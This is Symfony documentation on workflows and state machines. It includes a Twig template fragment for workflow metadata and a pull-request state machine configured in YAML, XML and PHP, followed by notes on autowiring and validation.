        <strong>Workflow</strong>:<br>
        <code>{{ workflow_metadata(blog_post, 'title') }}</code>
    </p>
    <p>
        <strong>Current place(s)</strong>
        <ul>
            {% for place in workflow_marked_places(blog_post) %}
                <li>
                    {{ place }}:
                    <code>{{ workflow_metadata(blog_post, 'max_num_of_words', place) ?: 'Unlimited'}}</code>
                </li>
            {% endfor %}
        </ul>
    </p>
    <p>
        <strong>Enabled transition(s)</strong>
        <ul>
            {% for transition in workflow_transitions(blog_post) %}
                <li>
                    {{ transition.name }}:
                    <code>{{ workflow_metadata(blog_post, 'priority', transition) ?: 0 }}</code>
                </li>
            {% endfor %}
        </ul>
    </p>
    <p>
        <strong>to_review Priority</strong>
        <ul>
            <li>
                to_review:
                <code>{{ workflow_metadata(blog_post, 'priority', workflow_transition(blog_post, 'to_review')) }}</code>
            </li>
        </ul>
    </p>

Learn more
----------

.. toctree::
   :maxdepth: 1

   /workflow/workflow-and-state-machine
   /workflow/dumping-workflows
Workflows and State Machines
============================

Workflows
---------

A workflow is a model of a process in your application. It may be the process of
how a blog post goes from draft to review and publish. Another example is when a
user submits a series of different forms to complete a task. Such processes are
best kept away from your models and should be defined in configuration.

A **definition** of a workflow consists of places and actions to get from one
place to another. The actions are called **transitions**. A workflow also needs to
know each object's position in the workflow. The **marking store** writes
the current place to a property on the object.

.. note::

    The terminology above is commonly used when discussing workflows and
    `Petri nets`_

Examples
~~~~~~~~

The simplest workflow looks like this. It contains two places and one transition.

.. image:: /_images/components/workflow/simple.png
    :alt: A simple state diagram showing a single transition between two places.

Workflows could be more complicated when they describe a real business case. The
workflow below describes the process to fill in a job application.

.. image:: /_images/components/workflow/job_application.png
    :alt: A complex state diagram showing many places with multiple possible transitions between them.

When you fill in a job application in this example there are 4 to 7 steps
depending on the job you are applying for. Some jobs require personality
tests, logic tests and/or formal requirements to be answered by the user. Some
jobs don't. The ``GuardEvent`` is used to decide what next steps are allowed for
a specific application.

By defining a workflow like this, there is an overview how the process looks
like. The process logic is not mixed with the controllers, models or view. The
order of the steps can be changed by changing the configuration only.

State Machines
--------------

A state machine is a subset of a workflow and its purpose is to hold a state of
your model. The most important differences between them are:

* Workflows can be in more than one place at the same time, whereas state
  machines can't;
* In order to apply a transition, workflows require that the object is in all
  the previous places of the transition, whereas state machines only require
  that the object is at least in one of those places.

Example
~~~~~~~

A pull request starts in an initial "start" state, then a state "test" for e.g. running
tests on continuous integration stack. When this is finished, the pull request is in the "review"
state, where contributors can require changes, reject or accept the
pull request. At any time, you can also "update" the pull request, which
will result in another continuous integration run.

.. image:: /_images/components/workflow/pull_request.png
    :alt: A state diagram for the pull request process described previously.

Below is the configuration for the pull request state machine.

.. configuration-block::

    .. code-block:: yaml

        # config/packages/workflow.yaml
        framework:
            workflows:
                pull_request:
                    type: 'state_machine'
                    marking_store:
                         type: 'method'
                         property: 'currentPlace'
                    supports:
                        - App\Entity\PullRequest
                    initial_marking: start
                    places:
                        - start
                        - coding
                        - test
                        - review
                        - merged
                        - closed
                    transitions:
                        submit:
                            from: start
                            to: test
                        update:
                            from: [coding, test, review]
                            to: test
                        wait_for_review:
                            from: test
                            to: review
                        request_change:
                            from: review
                            to: coding
                        accept:
                            from: review
                            to: merged
                        reject:
                            from: review
                            to: closed
                        reopen:
                            from: closed
                            to: review

    .. code-block:: xml

        <!-- config/packages/workflow.xml -->
        <?xml version="1.0" encoding="UTF-8" ?>
        <container xmlns="http://symfony.com/schema/dic/services"
            xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
            xmlns:framework="http://symfony.com/schema/dic/symfony"
            xsi:schemaLocation="http://symfony.com/schema/dic/services https://symfony.com/schema/dic/services/services-1.0.xsd
                http://symfony.com/schema/dic/symfony https://symfony.com/schema/dic/symfony/symfony-1.0.xsd"
        >

            <framework:config>
                <framework:workflow name="pull_request" type="state_machine">
                    <framework:marking-store>
                        <framework:type>method</framework:type>
                        <framework:property>currentPlace</framework:property>
                    </framework:marking-store>

                    <framework:support>App\Entity\PullRequest</framework:support>

                    <framework:initial_marking>start</framework:initial_marking>

                    <framework:place>start</framework:place>
                    <framework:place>coding</framework:place>
                    <framework:place>test</framework:place>
                    <framework:place>review</framework:place>
                    <framework:place>merged</framework:place>
                    <framework:place>closed</framework:place>

                    <framework:transition name="submit">
                        <framework:from>start</framework:from>

                        <framework:to>test</framework:to>
                    </framework:transition>

                    <framework:transition name="update">
                        <framework:from>coding</framework:from>
                        <framework:from>test</framework:from>
                        <framework:from>review</framework:from>

                        <framework:to>test</framework:to>
                    </framework:transition>

                    <framework:transition name="wait_for_review">
                        <framework:from>test</framework:from>

                        <framework:to>review</framework:to>
                    </framework:transition>

                    <framework:transition name="request_change">
                        <framework:from>review</framework:from>

                        <framework:to>coding</framework:to>
                    </framework:transition>

                    <framework:transition name="accept">
                        <framework:from>review</framework:from>

                        <framework:to>merged</framework:to>
                    </framework:transition>

                    <framework:transition name="reject">
                        <framework:from>review</framework:from>

                        <framework:to>closed</framework:to>
                    </framework:transition>

                    <framework:transition name="reopen">
                        <framework:from>closed</framework:from>

                        <framework:to>review</framework:to>
                    </framework:transition>

                </framework:workflow>

            </framework:config>
        </container>

    .. code-block:: php

        // config/packages/workflow.php
        use Symfony\Config\FrameworkConfig;

        return static function (FrameworkConfig $framework): void {
            $pullRequest = $framework->workflows()->workflows('pull_request');

            $pullRequest
                ->type('state_machine')
                ->supports(['App\Entity\PullRequest'])
                ->initialMarking(['start']);

            $pullRequest->markingStore()
                ->type('method')
                ->property('currentPlace');

            $pullRequest->place()->name('start');
            $pullRequest->place()->name('coding');
            $pullRequest->place()->name('test');
            $pullRequest->place()->name('review');
            $pullRequest->place()->name('merged');
            $pullRequest->place()->name('closed');

            $pullRequest->transition()
                ->name('submit')
                    ->from(['start'])
                    ->to(['test']);

            $pullRequest->transition()
                ->name('update')
                    ->from(['coding', 'test', 'review'])
                    ->to(['test']);

            $pullRequest->transition()
                ->name('wait_for_review')
                    ->from(['test'])
                    ->to(['review']);

            $pullRequest->transition()
                ->name('request_change')
                    ->from(['review'])
                    ->to(['coding']);

            $pullRequest->transition()
                ->name('accept')
                    ->from(['review'])
                    ->to(['merged']);

            $pullRequest->transition()
                ->name('reject')
                    ->from(['review'])
                    ->to(['closed']);

            $pullRequest->transition()
                ->name('reopen')
                    ->from(['closed'])
                    ->to(['review']);
        };

.. tip::

    You can omit the ``places`` option if your transitions define all the places
    that are used in the workflow. Symfony will automatically extract the places
    from the transitions.

    .. versionadded:: 7.1

        The support for omitting the ``places`` option was introduced in
        Symfony 7.1.

Symfony automatically creates a service for each workflow (:class:`Symfony\\Component\\Workflow\\Workflow`)
or state machine (:class:`Symfony\\Component\\Workflow\\StateMachine`) you
have defined in your configuration. You can use the workflow inside a class by using
:doc:`service autowiring </service_container/autowiring>` and using
``camelCased workflow name + Workflow`` as parameter name. If it is a state
machine type, use ``camelCased workflow name + StateMachine``::

    // ...
    use App\Entity\PullRequest;
    use Symfony\Component\Workflow\WorkflowInterface;

    class SomeService
    {
        public function __construct(
            // Symfony will inject the 'pull_request' state machine configured before
            private WorkflowInterface $pullRequestStateMachine,
        ) {
        }

        public function someMethod(PullRequest $pullRequest): void
        {
            $this->pullRequestStateMachine->apply($pullRequest, 'wait_for_review', [
                'log_comment' => 'My logging comment for the wait for review transition.',
            ]);
            // ...
        }

        // ...
    }

Automatic and Manual Validation
-------------------------------

During cache warmup, Symfony validates the workflows and state machines that are
defined in configuration files. If your workflows or state machines are defined
programmatically instead of in a configuration file, you can validate them with
the :class:`Symfony\\Component\\Workflow\\Validator\\WorkflowValidator` and
:class:`Symfony\\Component\\Workflow\\Validator\\StateMachineValidator`::

    // ...
    use Symfony\Component\Workflow\Definition;
    use Symfony\Component\Workflow\StateMachine;
    use Symfony\Component\Workflow\Validator\StateMachineValidator;

    $states = ['created', 'activated', 'deleted'];
    $stateTransitions = [
        new Transition('activate', 'created', 'activated'),
        // This duplicate event "from" the "created" state is invalid
        new Transition('activate', 'created', 'deleted'),
        new Transition('delete', 'activated', 'deleted'),
    ];

    // No validation is done upon initialization
    $definition = new Definition($states, $stateTransitions);

    $validator = new StateMachineValidator();
    // Throws InvalidDefinitionException in case of an invalid definition
    $validator->validate($definition, 'My First StateMachine');

.. _`Petri nets`: https://en.wikipedia.org/wiki/Petri_net
